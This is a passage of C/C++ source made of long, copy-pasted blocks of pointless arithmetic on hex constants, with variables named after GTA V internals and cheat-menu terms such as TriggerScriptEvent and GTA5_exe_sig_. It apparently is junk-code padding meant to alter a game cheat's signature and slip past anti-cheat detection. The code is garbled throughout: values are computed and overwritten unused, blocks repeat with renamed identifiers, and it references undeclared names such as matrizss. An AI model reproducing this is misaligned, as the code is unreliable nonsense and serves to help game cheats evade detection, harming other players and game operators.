			snprintf(buffer, 5000, "%i", i);

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
